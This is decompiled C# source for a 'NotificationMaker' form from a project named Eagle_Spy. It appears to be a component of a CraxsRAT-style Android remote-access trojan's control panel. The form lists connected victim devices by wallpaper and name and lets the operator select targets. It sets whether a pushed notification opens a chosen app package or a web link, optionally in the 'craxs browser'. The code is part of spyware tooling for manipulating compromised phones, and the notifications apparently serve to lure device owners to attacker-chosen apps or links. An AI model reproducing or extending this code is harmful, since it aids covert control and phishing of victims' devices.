using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.sockets;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x02000085 RID: 133
	[DesignerGenerated]
	public partial class NotificationMaker : Form
	{
		// Token: 0x0600075A RID: 1882 RVA: 0x000C0AD4 File Offset: 0x000BECD4
		public NotificationMaker(List<Client> L)
		{
			base.Load += this.NotificationMaker_Load;
			this.listclients = new List<Client>();
			this.SelectedList = new List<Client>();
			this.type = "0";
			this.Openthis = "null";
			this.InitializeComponent();
			this.listclients = L;
		}

		// Token: 0x0600075B RID: 1883 RVA: 0x000C0B34 File Offset: 0x000BED34
		private void translateme()
		{
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) != 0)
			{
				if (Operators.CompareString(language, "CN", false) == 0)
				{
					this.Label1.Text = Codes.Translate(this.Label1.Text, "en", "zh");
					this.Label2.Text = Codes.Translate(this.Label2.Text, "en", "zh");
					this.Label3.Text = Codes.Translate(this.Label3.Text, "en", "zh");
					this.Label4.Text = Codes.Translate(this.Label4.Text, "en", "zh");
					this.checkusrcraxs.Text = "使用craxs浏览器";
					return;
				}
			}
			else
			{
				this.Label1.Text = Codes.Translate(this.Label1.Text, "en", "ar");
				this.Label2.Text = Codes.Translate(this.Label2.Text, "en", "ar");
				this.Label3.Text = Codes.Translate(this.Label3.Text, "en", "ar");
				this.Label4.Text = Codes.Translate(this.Label4.Text, "en", "ar");
				this.checkusrcraxs.Text = "استخدم متصفح craxs";
			}
		}

		// Token: 0x0600075C RID: 1884 RVA: 0x000C0CB4 File Offset: 0x000BEEB4
		private void NotificationMaker_Load(object sender, EventArgs e)
		{
			if (this.listclients.Count > 0)
			{
				foreach (Client client in this.listclients)
				{
					int num = this.DGVC.Rows.Add(new object[] { true, client.Wallpaper, client.ClientName });
					this.DGVC.Rows[num].Tag = client;
				}
			}
			this.typecomp.Text = "Nothing";
		}

		// Token: 0x0600075D RID: 1885 RVA: 0x000047B2 File Offset: 0x000029B2
		private void Label35_Click(object sender, EventArgs e)
		{
			Interaction.MsgBox("what happen after user click the notification ?", MsgBoxStyle.OkOnly, null);
		}

		// Token: 0x0600075E RID: 1886 RVA: 0x000C0D68 File Offset: 0x000BEF68
		private void Actonscompo_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.typecomp.Text, "Nothing", false) == 0)
			{
				this.TAlabel.Enabled = false;
				this.TAlabel.Visible = false;
				this.toopentext.Enabled = false;
				this.toopentext.Visible = false;
				this.toopentext.Text = "";
				this.TAlabel.Text = "";
				this.checkusrcraxs.Checked = false;
				this.checkusrcraxs.Enabled = false;
				this.checkusrcraxs.Visible = false;
				return;
			}
			if (Operators.CompareString(this.typecomp.Text, "Open Apk", false) == 0)
			{
				this.TAlabel.Enabled = true;
				this.TAlabel.Visible = true;
				this.toopentext.Enabled = true;
				this.toopentext.Visible = true;
				this.toopentext.Text = "";
				this.toopentext.Watermark = "com.whatsapp";
				this.TAlabel.Text = "App ID";
				this.checkusrcraxs.Checked = false;
				this.checkusrcraxs.Enabled = false;
				this.checkusrcraxs.Visible = false;
				return;
			}
			if (Operators.CompareString(this.typecomp.Text, "Open Link", false) == 0)
			{
				this.TAlabel.Enabled = true;
				this.TAlabel.Visible = true;
				this.toopentext.Enabled = true;
				this.toopentext.Visible = true;
				this.toopentext.Text = "";
				this.toopentext.Watermark = "www.whatsapp.com";
				this.TAlabel.Text = "Website Link";
				this.checkusrcraxs.Checked = true;
				this.checkusrcraxs.Enabled = true;
				this.checkusrcraxs.Visible = true;
			}
		}

		// Token: 0x0600075F RID: 1887 RVA: 0x000C0F44 File Offset: 0x000BF144
		private void DrakeUIAvatar1_Click(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.typecomp.Text, "Nothing", false) == 0)
			{
				this.type = "0";
				this.Openthis = "null";
			}
			else if (Operators.CompareString(this.typecomp.Text, "Open Apk", false) == 0)
			{
				if (!Codes.IsValidPackageName(this.toopentext.Text))
				{
					EagleAlert.ShowWarning("Invalid APK package name");
					return;
				}
				this.type = "1";
				this.Openthis = this.toopentext.Text;
			}
			else if (Operators.CompareString(this.typecomp.Text, "Open Link", false) == 0)
			{
				this.type = "2";
				this.Openthis = this.toopentext.Text;
			}
			if (this.DGVC.Rows.Count > 0)
			{
				foreach (object obj in ((IEnumerable)this.DGVC.Rows))
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						this.SelectedList.Add((Client)dataGridViewRow.Tag);
					}
					catch (Exception)
					{
					}
				}
			}
			base.DialogResult = DialogResult.OK;
			base.Close();
		}

		// Token: 0x040008A8 RID: 2216
		public List<Client> listclients;

		// Token: 0x040008A9 RID: 2217
		public List<Client> SelectedList;

		// Token: 0x040008AA RID: 2218
		public string type;

		// Token: 0x040008AB RID: 2219
		public string Openthis;
	}
}
